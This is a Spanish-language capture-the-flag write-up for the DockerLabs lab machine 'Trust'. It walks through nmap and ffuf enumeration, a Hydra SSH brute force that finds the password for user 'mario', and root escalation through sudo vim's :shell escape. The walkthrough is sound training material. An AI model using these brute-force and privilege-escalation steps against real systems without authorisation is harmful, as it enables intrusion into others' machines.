# Writeup: Máquina "Trust" de DockerLabs

Una guía paso a paso del proceso de auditoría y compromiso total (de usuario a root) de la máquina **Trust**.

---

## 1. Fase de Reconocimiento

### Paso A: Comprobación de conectividad (Ping)

En primer lugar, verificamos la conectividad con la máquina objetivo mediante un ping.

```bash
ping -c 4 172.17.0.2
```

**Nota de análisis:**  
La respuesta del ping muestra un TTL (*Time To Live*) de `64` (o muy cercano), lo que nos indica que el sistema operativo de la máquina víctima es **Linux**.

---

### Paso B: Escaneo de puertos (Nmap)

Realizamos un escaneo rápido con `nmap` para identificar qué puertos y servicios están expuestos en el objetivo.

```bash
nmap 172.17.0.2
```

**Resultado del escaneo:**

- `22/tcp` (**open**): servicio **SSH** activo.
- `80/tcp` (**open**): servicio **HTTP** (servidor web) activo.

---

## 2. Enumeración Web (Fuzzing de directorios)

Al ver que el puerto 80 está abierto y muestra la página por defecto de Apache (falso positivo de tamaño `10701` bytes), ejecutamos un escaneo de directorios con `ffuf` filtrando ese tamaño.

### Comando de fuzzing

```bash
ffuf -u http://172.17.0.2/FUZZ -w /usr/share/wordlists/dirb/common.txt -fs 10701 -e .html,.php,.txt -r -v
```

### Explicación del comando

- `-u http://172.17.0.2/FUZZ`: especifica la URL objetivo, reemplazando `FUZZ` con cada entrada del diccionario.
- `-w /usr/share/wordlists/dirb/common.txt`: ruta del diccionario utilizado.
- `-fs 10701`: filtra y oculta respuestas con tamaño `10701` (evita ruido de la página por defecto).
- `-e .html,.php,.txt`: fuerza búsqueda de archivos con esas extensiones.
- `-r`: sigue redirecciones automáticamente.
- `-v`: modo detallado (*verbose*).

### Resultado del fuzzing

Se descubre la ruta oculta `secret.php`.  
Al acceder desde el navegador, se visualiza el texto:

> "hola mario"

Esto nos revela un usuario potencial para el sistema: **mario**.

---

## 3. Intrusión (Fuerza bruta a SSH)

Teniendo el usuario legítimo (`mario`) y el puerto SSH (`22`) abierto, utilizamos **Hydra** junto al diccionario `rockyou.txt` para encontrar la contraseña.

### Comando de Hydra

```bash
hydra -l mario -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 4 -v
```

### Explicación del comando

- `-l mario`: define el usuario objetivo.
- `-P /usr/share/wordlists/rockyou.txt`: carga el diccionario de contraseñas.
- `-t 4`: limita a 4 hilos en paralelo (evita saturación y errores como `Connection reset by peer`).
- `-v`: modo *verbose* para ver intentos en tiempo real.

### Credencial obtenida

- **Usuario:** `mario`
- **Contraseña:** `chocolate`

### Acceso inicial

Nos conectamos por SSH a la máquina víctima:

```bash
ssh mario@172.17.0.2
```

Introducimos la contraseña `chocolate` y ganamos acceso como usuario local.

---

## 4. Escalada de privilegios (de mario a root)

Una vez dentro del sistema, comprobamos privilegios sudo:

```bash
sudo -l
```

### Salida relevante

```text
mario@7e140299d80a:~$ sudo -l
[sudo] password for mario:
Matching Defaults entries for mario on 7e140299d80a:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User mario may run the following commands on 7e140299d80a:
    (ALL) /usr/bin/vim
```

El resultado indica que `mario` puede ejecutar `/usr/bin/vim` como `root` sin restricciones.

### Explotación de Vim (escape de consola)

Iniciamos Vim con privilegios elevados:

```bash
sudo vim
```

Dentro de Vim, ejecutamos:

```vim
:shell
```

Al presionar Enter, se abre una shell heredando los privilegios de `sudo`, obteniendo terminal como **root**.

### Confirmación de privilegios

```bash
whoami
```

Salida esperada:

```text
root
```

✅ ¡Máquina completamente comprometida! Hemos obtenido acceso como **root**.

---

## Conclusión

La cadena de compromiso fue:

1. **Reconocimiento** (`ping`, `nmap`)
2. **Enumeración web** (`ffuf`) → descubrimiento de `secret.php`
3. **Acceso inicial** por SSH con Hydra (`mario:chocolate`)
4. **Escalada de privilegios** abusando de `sudo vim` + `:shell`

---
